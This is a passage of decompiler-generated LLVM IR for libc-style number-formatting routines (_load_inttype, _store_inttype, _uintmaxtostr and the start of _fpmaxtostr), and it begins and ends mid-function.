  %v3_80542ec = and i16 %v2_80542ec, -4
  store i16 %v3_80542ec, i16* %v1_80542ec, align 2
  %v0_80542f0 = load i32, i32* @ebx, align 4
  %v1_80542f0 = add i32 %v0_80542f0, 8
  %v2_80542f0 = inttoptr i32 %v1_80542f0 to i32*
  %v3_80542f0 = load i32, i32* %v2_80542f0, align 4
  store i32 %v3_80542f0, i32* %eax.global-to-local, align 4
  %v2_80542f3 = add i32 %v0_80542f0, 24
  %v3_80542f3 = inttoptr i32 %v2_80542f3 to i32*
  store i32 %v3_80542f0, i32* %v3_80542f3, align 4
  %v0_80542f6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80542f6 = load i32, i32* @ebx, align 4
  %v2_80542f6 = add i32 %v1_80542f6, 16
  %v3_80542f6 = inttoptr i32 %v2_80542f6 to i32*
  store i32 %v0_80542f6, i32* %v3_80542f6, align 4
  %v0_80542f9 = load i32, i32* %eax.global-to-local, align 4
  %v1_80542f9 = load i32, i32* @ebx, align 4
  %v2_80542f9 = add i32 %v1_80542f9, 20
  %v3_80542f9 = inttoptr i32 %v2_80542f9 to i32*
  store i32 %v0_80542f9, i32* %v3_80542f9, align 4
  %v0_80542fc.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80542fc

dec_label_pc_80542fc:                             ; preds = %dec_label_pc_80542b6, %dec_label_pc_80542ec
  %v9_80542fc = phi i32 [ %v0_80542df, %dec_label_pc_80542b6 ], [ %v0_80542fc.pre, %dec_label_pc_80542ec ]
  %v1_80542fc = inttoptr i32 %v9_80542fc to i16*
  %v2_80542fc = load i16, i16* %v1_80542fc, align 2
  %v3_80542fc = or i16 %v2_80542fc, 64
  store i16 %v3_80542fc, i16* %v1_80542fc, align 2
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_8054302 = load i32, i32* @ebx, align 4
  %v1_8054302 = inttoptr i32 %v0_8054302 to i16*
  %v2_8054302 = load i16, i16* %v1_8054302, align 2
  %v3_8054302 = zext i16 %v2_8054302 to i32
  store i32 %v3_8054302, i32* %eax.global-to-local, align 4
  %v3_8054305 = and i16 %v2_8054302, 2816
  %v4_8054305 = icmp eq i16 %v3_8054305, 0
  %v1_8054308 = icmp eq i1 %v4_8054305, false
  br i1 %v1_8054308, label %dec_label_pc_8054310, label %dec_label_pc_805430a

dec_label_pc_805430a:                             ; preds = %dec_label_pc_80542fc
  %v1_805430a = add i32 %v0_8054302, 12
  %v2_805430a = inttoptr i32 %v1_805430a to i32*
  %v3_805430a = load i32, i32* %v2_805430a, align 4
  store i32 %v3_805430a, i32* %eax.global-to-local, align 4
  %v2_805430d = add i32 %v0_8054302, 28
  %v3_805430d = inttoptr i32 %v2_805430d to i32*
  store i32 %v3_805430a, i32* %v3_805430d, align 4
  %v0_8054310.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054310

dec_label_pc_8054310:                             ; preds = %dec_label_pc_80542fc, %dec_label_pc_80542ad, %dec_label_pc_805430a
  %v0_8054310 = phi i32 [ 0, %dec_label_pc_80542fc ], [ -1, %dec_label_pc_80542ad ], [ %v0_8054310.pre, %dec_label_pc_805430a ]
  store i32 %v0_8054310, i32* %eax.global-to-local, align 4
  %v2_8054312 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054312, i32* @edx, align 4
  store i32 %v0_8054278, i32* @ebx, align 4
  ret i32 %v0_8054310

; uselistorder directives
  uselistorder i32 %v0_8054310, { 1, 0 }
  uselistorder i32 %v0_8054302, { 1, 0, 2 }
  uselistorder i32 %tmp18, { 1, 0 }
  uselistorder i32 %v1_80542cd, { 1, 0, 2 }
  uselistorder i32 %v0_80542df, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v1_8054286, { 1, 0 }
  uselistorder i32 %v2_8054284, { 1, 2, 0, 3 }
  uselistorder i32 %v0_8054278, { 1, 0 }
  uselistorder i32 1024, { 0, 17, 3, 10, 8, 18, 4, 1, 2, 15, 5, 14, 6, 16, 9, 11, 12, 13, 7 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8054310, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80542fc, { 1, 0 }
  uselistorder label %dec_label_pc_805429a, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %v5_8054320 = icmp slt i32 %tmp, 0
  %v3_8054349 = and i32 %tmp5, 2048
  %v4_8054349 = icmp eq i32 %v3_8054349, 0
  br i1 %v5_8054320, label %dec_label_pc_8054349, label %dec_label_pc_8054327

dec_label_pc_8054327:                             ; preds = %entry
  %v1_805432a = icmp eq i1 %v4_8054349, false
  br i1 %v1_805432a, label %dec_label_pc_805434e, label %dec_label_pc_805432c

dec_label_pc_805432c:                             ; preds = %dec_label_pc_8054327
  %v1_805432c = inttoptr i32 %tmp4 to i32*
  %v2_805432c = load i32, i32* %v1_805432c, align 4
  %v6_805432e = icmp eq i32 %tmp5, 256
  %v1_8054334 = icmp eq i1 %v6_805432e, false
  br i1 %v1_8054334, label %dec_label_pc_805433b, label %dec_label_pc_8054336

dec_label_pc_8054336:                             ; preds = %dec_label_pc_805432c
  %v1_8054336 = urem i32 %v2_805432c, 256
  br label %dec_label_pc_8054346

dec_label_pc_805433b:                             ; preds = %dec_label_pc_805432c
  %v6_805433b = icmp eq i32 %tmp5, 512
  %v1_8054341 = icmp eq i1 %v6_805433b, false
  br i1 %v1_8054341, label %dec_label_pc_8054346, label %dec_label_pc_8054343

dec_label_pc_8054343:                             ; preds = %dec_label_pc_805433b
  %v1_8054343 = urem i32 %v2_805432c, 65536
  br label %dec_label_pc_8054346

dec_label_pc_8054346:                             ; preds = %dec_label_pc_805433b, %dec_label_pc_8054336, %dec_label_pc_8054343
  %v0_8054348 = phi i32 [ %v2_805432c, %dec_label_pc_805433b ], [ %v1_8054336, %dec_label_pc_8054336 ], [ %v1_8054343, %dec_label_pc_8054343 ]
  store i32 0, i32* @edx, align 4
  ret i32 %v0_8054348

dec_label_pc_8054349:                             ; preds = %entry
  br i1 %v4_8054349, label %dec_label_pc_8054354, label %dec_label_pc_805434e

dec_label_pc_805434e:                             ; preds = %dec_label_pc_8054349, %dec_label_pc_8054327
  %v1_805434e = add i32 %tmp4, 4
  %v2_805434e = inttoptr i32 %v1_805434e to i32*
  %v3_805434e = load i32, i32* %v2_805434e, align 4
  store i32 %v3_805434e, i32* @edx, align 4
  %v1_8054351 = inttoptr i32 %tmp4 to i32*
  %v2_8054351 = load i32, i32* %v1_8054351, align 4
  ret i32 %v2_8054351

dec_label_pc_8054354:                             ; preds = %dec_label_pc_8054349
  %v1_8054354 = inttoptr i32 %tmp4 to i32*
  %v2_8054354 = load i32, i32* %v1_8054354, align 4
  %v6_8054356 = icmp eq i32 %tmp5, 256
  %v1_805435c = icmp eq i1 %v6_8054356, false
  br i1 %v1_805435c, label %dec_label_pc_8054363, label %dec_label_pc_805435e

dec_label_pc_805435e:                             ; preds = %dec_label_pc_8054354
  %v1_805435e = mul i32 %v2_8054354, 16777216
  %v2_805435e = sdiv i32 %v1_805435e, 16777216
  br label %dec_label_pc_805436c

dec_label_pc_8054363:                             ; preds = %dec_label_pc_8054354
  %v6_8054363 = icmp eq i32 %tmp5, 512
  %v1_8054369 = icmp eq i1 %v6_8054363, false
  br i1 %v1_8054369, label %dec_label_pc_805436c, label %dec_label_pc_805436b

dec_label_pc_805436b:                             ; preds = %dec_label_pc_8054363
  %v1_805436b = mul i32 %v2_8054354, 65536
  %v2_805436b = sdiv i32 %v1_805436b, 65536
  br label %dec_label_pc_805436c

dec_label_pc_805436c:                             ; preds = %dec_label_pc_8054363, %dec_label_pc_805435e, %dec_label_pc_805436b
  %v0_805436c = phi i32 [ %v2_8054354, %dec_label_pc_8054363 ], [ %v2_805435e, %dec_label_pc_805435e ], [ %v2_805436b, %dec_label_pc_805436b ]
  %v1_805436c = ashr i32 %v0_805436c, 31
  store i32 %v1_805436c, i32* @edx, align 4
  ret i32 %v0_805436c

; uselistorder directives
  uselistorder i32 %v0_805436c, { 1, 0 }
  uselistorder i32 %v2_8054354, { 2, 0, 1 }
  uselistorder i32 %v2_805432c, { 2, 0, 1 }
  uselistorder i32 %tmp4, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_805436c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054346, { 2, 0, 1 }
}

define i32 @_store_inttype() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i16* @__decompiler_undefined_function_6()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8054370 = load i32, i32* @ebx, align 4
  store i32 %v0_8054370, i32* %stack_var_-4, align 4
  store i32 %tmp6, i32* @ecx, align 4
  %v4_8054375 = ptrtoint i16* %tmp5 to i32
  store i32 %v4_8054375, i32* %ebx.global-to-local, align 4
  %v4_8054379 = trunc i32 %tmp4 to i16
  %v6_8054381 = icmp eq i32 %tmp6, 256
  %v1_8054387 = icmp eq i1 %v6_8054381, false
  br i1 %v1_8054387, label %dec_label_pc_805438d, label %dec_label_pc_8054389

dec_label_pc_8054389:                             ; preds = %entry
  %v2_8054389 = trunc i32 %tmp4 to i8
  %v4_8054389 = bitcast i16* %tmp5 to i8*
  store i8 %v2_8054389, i8* %v4_8054389, align 1
  br label %dec_label_pc_80543ab

dec_label_pc_805438d:                             ; preds = %entry
  %v6_805438d = icmp eq i32 %tmp6, 2048
  %v1_8054393 = icmp eq i1 %v6_805438d, false
  br i1 %v1_8054393, label %dec_label_pc_805439c, label %dec_label_pc_8054395

dec_label_pc_8054395:                             ; preds = %dec_label_pc_805438d
  %sext2 = mul i32 %tmp4, 65536
  %v1_8054395 = sdiv i32 %sext2, 65536
  %v3_8054395 = bitcast i16* %tmp5 to i32*
  store i32 %v1_8054395, i32* %v3_8054395, align 4
  %v0_8054397 = load i32, i32* %edx.global-to-local, align 4
  %v1_8054397 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054397 = add i32 %v1_8054397, 4
  %v3_8054397 = inttoptr i32 %v2_8054397 to i32*
  store i32 %v0_8054397, i32* %v3_8054397, align 4
  br label %dec_label_pc_80543ab

dec_label_pc_805439c:                             ; preds = %dec_label_pc_805438d
  %v6_805439c = icmp eq i32 %tmp6, 512
  %v1_80543a2 = icmp eq i1 %v6_805439c, false
  br i1 %v1_80543a2, label %dec_label_pc_80543a9, label %dec_label_pc_80543a4

dec_label_pc_80543a4:                             ; preds = %dec_label_pc_805439c
  store i16 %v4_8054379, i16* %tmp5, align 2
  br label %dec_label_pc_80543ab

dec_label_pc_80543a9:                             ; preds = %dec_label_pc_805439c
  %sext3 = mul i32 %tmp4, 65536
  %v1_80543a9 = sdiv i32 %sext3, 65536
  %v3_80543a9 = bitcast i16* %tmp5 to i32*
  store i32 %v1_80543a9, i32* %v3_80543a9, align 4
  br label %dec_label_pc_80543ab

dec_label_pc_80543ab:                             ; preds = %dec_label_pc_80543a4, %dec_label_pc_8054395, %dec_label_pc_8054389, %dec_label_pc_80543a9
  %v2_80543ab = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80543ab, i32* %ebx.global-to-local, align 4
  %sext = mul i32 %tmp4, 65536
  %v1_80543ac = sdiv i32 %sext, 65536
  ret i32 %v1_80543ac

; uselistorder directives
  uselistorder label %dec_label_pc_80543ab, { 3, 0, 1, 2 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v4_80543bb = ptrtoint i8* %arg1 to i32
  store i32 %v4_80543bb, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %v2_80543c7 = icmp slt i32 %arg4, 0
  %v1_80543c9 = icmp eq i1 %v2_80543c7, false
  br i1 %v1_80543c9, label %dec_label_pc_80543ea, label %dec_label_pc_80543cb

dec_label_pc_80543cb:                             ; preds = %entry
  %v1_80543cb = sub i32 0, %arg4
  store i32 %v1_80543cb, i32* %esi.global-to-local, align 4
  %v2_80543cd = icmp slt i32 %arg3, 0
  %v1_80543cf = icmp eq i1 %v2_80543cd, false
  br i1 %v1_80543cf, label %dec_label_pc_80543ea, label %dec_label_pc_80543d1

dec_label_pc_80543d1:                             ; preds = %dec_label_pc_80543cb
  %v1_80543d1 = sub i32 0, %arg2
  %v5_80543d1 = icmp ne i32 %arg2, 0
  store i32 %v1_80543d1, i32* %ecx.global-to-local, align 4
  %v2_80543d3 = zext i1 %v5_80543d1 to i32
  %v3_80543d3 = add i32 %v2_80543d3, %arg3
  %v1_80543de = sub i32 0, %v3_80543d3
  store i32 %v1_80543de, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80543ea

dec_label_pc_80543ea:                             ; preds = %entry, %dec_label_pc_80543cb, %dec_label_pc_80543d1
  %v0_80543ef = phi i32 [ %v1_80543cb, %dec_label_pc_80543d1 ], [ %v1_80543cb, %dec_label_pc_80543cb ], [ %arg4, %entry ]
  %stack_var_-28.0 = phi i32 [ 1, %dec_label_pc_80543d1 ], [ 0, %dec_label_pc_80543cb ], [ 0, %entry ]
  %div = udiv i32 -1, %v0_80543ef
  %tmp36 = urem i32 -1, %v0_80543ef
  %v1_80543f1 = add i32 %tmp36, 1
  store i8 0, i8* %arg1, align 1
  %v1_80543f5 = load i32, i32* %esi.global-to-local, align 4
  %v12_80543f5 = icmp eq i32 %v1_80543f1, %v1_80543f5
  %v1_80543ff = icmp eq i1 %v12_80543f5, false
  br i1 %v1_80543ff, label %dec_label_pc_805440e, label %dec_label_pc_8054401

dec_label_pc_8054401:                             ; preds = %dec_label_pc_80543ea
  %v1_8054401 = add i32 %div, 1
  br label %dec_label_pc_805440e

dec_label_pc_805440e:                             ; preds = %dec_label_pc_80543ea, %dec_label_pc_8054401
  %stack_var_-20.0.off0 = phi i32 [ %v1_80543f1, %dec_label_pc_80543ea ], [ 0, %dec_label_pc_8054401 ]
  %stack_var_-24.0.in = phi i32 [ %div, %dec_label_pc_80543ea ], [ %v1_8054401, %dec_label_pc_8054401 ]
  %v0_805440e = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_805440e, i32* %ebp.global-to-local, align 4
  %v0_8054410 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8054410, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8054416

dec_label_pc_8054416:                             ; preds = %dec_label_pc_8054455, %dec_label_pc_805440e
  %v0_805444d = phi i32 [ %v0_8054466, %dec_label_pc_8054455 ], [ %v0_805440e, %dec_label_pc_805440e ]
  %v0_805441a = phi i32 [ %v1_8054468, %dec_label_pc_8054455 ], [ %v0_8054410, %dec_label_pc_805440e ]
  %v1_8054416 = icmp eq i32 %v0_805441a, 0
  br i1 %v1_8054416, label %dec_label_pc_805444d, label %dec_label_pc_805441a

dec_label_pc_805441a:                             ; preds = %dec_label_pc_8054416
  %v0_805441e = load i32, i32* %esi.global-to-local, align 4
  %div8 = udiv i32 %v0_805441a, %v0_805441e
  %tmp37 = urem i32 %v0_805441a, %v0_805441e
  store i32 %div8, i32* %ebx.global-to-local, align 4
  %div9 = udiv i32 %v0_805444d, %v0_805441e
  %tmp38 = urem i32 %v0_805444d, %v0_805441e
  store i32 %div9, i32* %ebp.global-to-local, align 4
  %v6_8054431 = mul i32 %tmp37, %stack_var_-20.0.off0
  %v2_8054435 = add i32 %tmp38, %v6_8054431
  %v8_805443b = mul i32 %tmp37, %stack_var_-24.0.in
  %v2_8054440 = add i32 %div9, %v8_805443b
  store i32 %v2_8054440, i32* %ecx.global-to-local, align 4
  %div10 = udiv i32 %v2_8054435, %v0_805441e
  %tmp39 = urem i32 %v2_8054435, %v0_805441e
  %v2_8054448 = add i32 %div10, %v2_8054440
  br label %dec_label_pc_8054455

dec_label_pc_805444d:                             ; preds = %dec_label_pc_8054416
  %v0_8054451 = load i32, i32* %esi.global-to-local, align 4
  %div13 = udiv i32 %v0_805444d, %v0_8054451
  %tmp40 = urem i32 %v0_805444d, %v0_8054451
  br label %dec_label_pc_8054455

dec_label_pc_8054455:                             ; preds = %dec_label_pc_805441a, %dec_label_pc_805444d
  %v0_805445b = phi i32 [ %tmp39, %dec_label_pc_805441a ], [ %tmp40, %dec_label_pc_805444d ]
  %storemerge = phi i32 [ %v2_8054448, %dec_label_pc_805441a ], [ %div13, %dec_label_pc_805444d ]
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  %v0_8054455 = load i32, i32* %edi.global-to-local, align 4
  %v1_8054455 = add i32 %v0_8054455, -1
  store i32 %v1_8054455, i32* %edi.global-to-local, align 4
  %tmp41 = icmp ult i32 %v0_805445b, 10
  %storemerge15.in.v = select i1 %tmp41, i32 48, i32 %arg5
  %storemerge15.in = add i32 %storemerge15.in.v, %v0_805445b
  %v8_805445b = trunc i32 %storemerge15.in to i8
  %v3_8054464 = inttoptr i32 %v1_8054455 to i8*
  store i8 %v8_805445b, i8* %v3_8054464, align 1
  %v0_8054466 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8054468 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054468 = or i32 %v1_8054468, %v0_8054466
  %v3_8054468 = icmp eq i32 %v2_8054468, 0
  %v1_805446a = icmp eq i1 %v3_8054468, false
  br i1 %v1_805446a, label %dec_label_pc_8054416, label %dec_label_pc_805446c

dec_label_pc_805446c:                             ; preds = %dec_label_pc_8054455
  %v4_805446c = icmp eq i32 %stack_var_-28.0, 0
  br i1 %v4_805446c, label %dec_label_pc_8054477, label %dec_label_pc_8054473

dec_label_pc_8054473:                             ; preds = %dec_label_pc_805446c
  %v0_8054473 = load i32, i32* %edi.global-to-local, align 4
  %v1_8054473 = add i32 %v0_8054473, -1
  store i32 %v1_8054473, i32* %edi.global-to-local, align 4
  %v1_8054474 = inttoptr i32 %v1_8054473 to i8*
  store i8 45, i8* %v1_8054474, align 1
  br label %dec_label_pc_8054477

dec_label_pc_8054477:                             ; preds = %dec_label_pc_805446c, %dec_label_pc_8054473
  %v0_805447a = load i32, i32* %edi.global-to-local, align 4
  ret i32 %v0_805447a

; uselistorder directives
  uselistorder i32 %v2_8054435, { 1, 0 }
  uselistorder i32 %v0_805441e, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v0_805441a, { 1, 0, 2 }
  uselistorder i32 %v0_805444d, { 1, 0, 3, 2 }
  uselistorder i32 %v0_80543ef, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %edi.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 3, 1, 4 }
  uselistorder i8 45, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054477, { 1, 0 }
  uselistorder label %dec_label_pc_8054455, { 1, 0 }
  uselistorder label %dec_label_pc_805440e, { 1, 0 }
  uselistorder label %dec_label_pc_80543ea, { 2, 1, 0 }
}

define i32 @_fpmaxtostr() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %fpu_stat_TOP.global-to-local = alloca i3, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %st1.global-to-local = alloca x86_fp80, align 4
  store i3 0, i3* %fpu_stat_TOP.global-to-local, align 1
  %tmp103 = call i16 @__decompiler_undefined_function_5()
  %tmp112 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-22 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-49 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-70 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8054485 = load i32, i32* @edi, align 4
  %v0_8054486 = load i32, i32* @esi, align 4
  %v0_8054487 = load i32, i32* @ebx, align 4
  store i32 %v0_8054487, i32* %stack_var_-16, align 4
  store i32 %tmp112, i32* %eax.global-to-local, align 4
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v4_805449c = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v5_805449c = add i3 %v4_805449c, -1
  store i3 %v5_805449c, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_80544a3 = add i32 %tmp112, 4
  %v2_80544a3 = inttoptr i32 %v1_80544a3 to i32*
  %v3_80544a3 = load i32, i32* %v2_80544a3, align 4
  store i32 %v3_80544a3, i32* %eax.global-to-local, align 4
  %v1_80544aa = add i32 %tmp112, 8
  %v2_80544aa = inttoptr i32 %v1_80544aa to i8*
  %v3_80544aa = load i8, i8* %v2_80544aa, align 1
  %v4_80544aa = zext i8 %v3_80544aa to i32
  %v5_80544aa = load i32, i32* @ecx, align 4
  %v6_80544aa = and i32 %v5_80544aa, -256
  %v7_80544aa = or i32 %v6_80544aa, %v4_80544aa
  store i32 %v7_80544aa, i32* %ecx.global-to-local, align 4
  %v1_80544ad = inttoptr i32 %tmp112 to i32*
  %v2_80544ad = load i32, i32* %v1_80544ad, align 4
  store i32 %v2_80544ad, i32* %ebp.global-to-local, align 4
  %v3_80544af = and i32 %v3_80544a3, -256
  %v4_80544af = or i32 %v3_80544af, %v4_80544aa
  %v1_80544b5 = or i32 %v4_80544af, 32
  %v3_80544b5 = trunc i32 %v1_80544b5 to i8
  store i32 %v1_80544b5, i32* %eax.global-to-local, align 4
  %v10_80544c0 = icmp eq i8 %v3_80544b5, 97
  %v1_80544c2 = icmp eq i1 %v10_80544c0, false
  br i1 %v1_80544c2, label %dec_label_pc_80544cb, label %dec_label_pc_80544c4

dec_label_pc_80544c4:                             ; preds = %entry
  %v1_80544c4 = add i32 %v7_80544aa, 6
  %v11_80544c4 = trunc i32 %v1_80544c4 to i8
  store i32 %v1_80544c4, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80544cb

dec_label_pc_80544cb:                             ; preds = %entry, %dec_label_pc_80544c4
  %stack_var_-206.0 = phi i8 [ %v3_80544aa, %entry ], [ %v11_80544c4, %dec_label_pc_80544c4 ]
  %v2_80544cb = icmp slt i32 %v2_80544ad, 0
  %v1_80544cd = icmp eq i1 %v2_80544cb, false
  br i1 %v1_80544cd, label %dec_label_pc_80544d4, label %dec_label_pc_80544cf

dec_label_pc_80544cf:                             ; preds = %dec_label_pc_80544cb
  store i32 6, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80544d4

dec_label_pc_80544d4:                             ; preds = %dec_label_pc_80544cb, %dec_label_pc_80544cf
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v1_80544e3 = add i32 %tmp112, 12
  %v2_80544e3 = inttoptr i32 %v1_80544e3 to i32*
  %v3_80544e3 = load i32, i32* %v2_80544e3, align 4
  store i32 %v3_80544e3, i32* %eax.global-to-local, align 4
  %v2_80544e6 = and i32 %v3_80544e3, 2
  %v3_80544e6 = icmp eq i32 %v2_80544e6, 0
  br i1 %v3_80544e6, label %dec_label_pc_80544f4, label %dec_label_pc_8054500

dec_label_pc_80544f4:                             ; preds = %dec_label_pc_80544d4
  %v2_80544f4 = urem i32 %v3_80544e3, 2
  %tmp143 = trunc i32 %v2_80544f4 to i8
  %tmp = sub nsw i8 0, %tmp143
  %tmp144 = and i8 %tmp, 32
  br label %dec_label_pc_8054500

dec_label_pc_8054500:                             ; preds = %dec_label_pc_80544f4, %dec_label_pc_80544d4
  %stack_var_-26.0 = phi i8 [ 32, %dec_label_pc_80544d4 ], [ %tmp144, %dec_label_pc_80544f4 ]
  %v1_8054514 = udiv i32 %v3_80544e3, 256
  %tmp146 = and i32 %v1_8054514, 68
  %tmp147 = icmp eq i32 %tmp146, 64
  br i1 %tmp147, label %dec_label_pc_8054666, label %dec_label_pc_8054586

dec_label_pc_8054586:                             ; preds = %dec_label_pc_8054500
  store i3 %v4_805449c, i3* %fpu_stat_TOP.global-to-local, align 1
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v1_805458d = add i32 %tmp112, 16
  %v2_805458d = inttoptr i32 %v1_805458d to i32*
  store i32 32, i32* %v2_805458d, align 4
  store i32 3, i32* %stack_var_-152, align 4
  %v4_80545a4 = add i8 %stack_var_-206.0, -96
  %v6_80545a4 = sub i8 95, %stack_var_-206.0
  %v7_80545a4 = and i8 %v6_80545a4, %stack_var_-206.0
  %v8_80545a4 = icmp slt i8 %v7_80545a4, 0
  %v9_80545a4 = icmp eq i8 %v4_80545a4, 0
  %v10_80545a4 = icmp slt i8 %v4_80545a4, 0
  %v3_80545a9 = icmp eq i1 %v10_80545a4, %v8_80545a4
  %v4_80545a9 = icmp eq i1 %v9_80545a4, false
  %v5_80545a9 = and i1 %v4_80545a9, %v3_80545a9
  br i1 %v5_80545a9, label %dec_label_pc_80545b0, label %dec_label_pc_80545ab

dec_label_pc_80545ab:                             ; preds = %dec_label_pc_8054586
  br label %dec_label_pc_80545b0

dec_label_pc_80545b0:                             ; preds = %dec_label_pc_8054586, %dec_label_pc_80545ab
  %v2_80545b8 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_80545b8, i32* @ecx, align 4
  br label %dec_label_pc_805498b

dec_label_pc_8054666:                             ; preds = %dec_label_pc_8054500
  %v1_8054525 = add i3 %v4_805449c, -2
  store x86_fp80 0xK3FFF8000000000000000, x86_fp80* %st0.global-to-local, align 4
  %v6_805466a = and i32 %v3_80544e3, -65536
  %v2_805466f = ptrtoint i32* %stack_var_-70 to i32
  store i32 %v2_805466f, i32* %edx.global-to-local, align 4
  %v1_8054676 = udiv i16 %tmp103, 256
  %v2_8054676 = zext i16 %v1_8054676 to i32
  %v3_8054676 = mul nuw nsw i32 %v2_8054676, 256
  %tmp148 = urem i16 %tmp103, 256
  %v4_805466a.masked = zext i16 %tmp148 to i32
  %v11_8054676 = or i32 %v4_805466a.masked, %v3_8054676
  %v10_8054676 = or i32 %v11_8054676, %v6_805466a
  %v12_8054676 = or i32 %v10_8054676, 3072
  store i32 %v12_8054676, i32* %eax.global-to-local, align 4
  store i32 0, i32* @edi, align 4
  store x86_fp80 0xK401CEE6B280000000000, x86_fp80* %st1.global-to-local, align 4
  store i3 %v1_8054525, i3* %fpu_stat_TOP.global-to-local, align 1
  br label %dec_label_pc_805468a

dec_label_pc_805468a:                             ; preds = %dec_label_pc_80546db.dec_label_pc_805468a_crit_edge, %dec_label_pc_8054666
  %v2_80546a7 = phi x86_fp80 [ 0xK3FFF8000000000000000, %dec_label_pc_8054666 ], [ %v2_80546a7.pre, %dec_label_pc_80546db.dec_label_pc_805468a_crit_edge ]
  %v1_805468a = phi i3 [ %v1_8054525, %dec_label_pc_8054666 ], [ %v1_805468a.pre, %dec_label_pc_80546db.dec_label_pc_805468a_crit_edge ]
  %v3_80546b1 = phi x86_fp80 [ 0xK401CEE6B280000000000, %dec_label_pc_8054666 ], [ %v0_805468a.pre, %dec_label_pc_80546db.dec_label_pc_805468a_crit_edge ]
  %stack_var_-212.0 = phi i32 [ %v2_805466f, %dec_label_pc_8054666 ], [ %v4_80546ac, %dec_label_pc_80546db.dec_label_pc_805468a_crit_edge ]
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %tmp149 = fptosi x86_fp80 %v3_80546b1 to i32
  store i32 %tmp149, i32* %eax.global-to-local, align 4
  store i32 %tmp149, i32* %ebx.global-to-local, align 4
  %v5_80546a4 = sitofp i32 %tmp149 to x86_fp80
  %v4_80546a7 = fsub x86_fp80 %v2_80546a7, %v5_80546a4
  store i3 %v1_805468a, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_80546ac = add i32 %stack_var_-212.0, 9
  %v4_80546b1 = fmul x86_fp80 %v3_80546b1, %v4_80546a7
  store x86_fp80 %v4_80546b1, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_80546b3

dec_label_pc_80546b3:                             ; preds = %dec_label_pc_80546b3.dec_label_pc_80546b3_crit_edge, %dec_label_pc_805468a
  %v0_80546c5 = phi i32 [ %v0_80546c5.pre, %dec_label_pc_80546b3.dec_label_pc_80546b3_crit_edge ], [ %tmp149, %dec_label_pc_805468a ]
  %v0_80546b3 = phi i32 [ %v0_80546b3.pre, %dec_label_pc_80546b3.dec_label_pc_80546b3_crit_edge ], [ 0, %dec_label_pc_805468a ]
  %v1_80546b3 = add i32 %v0_80546b3, 1
  store i32 %v1_80546b3, i32* %esi.global-to-local, align 4
  %v2_80546b8 = sub i32 %v4_80546ac, %v1_80546b3
  store i32 10, i32* %ecx.global-to-local, align 4
  %div = udiv i32 %v0_80546c5, 10
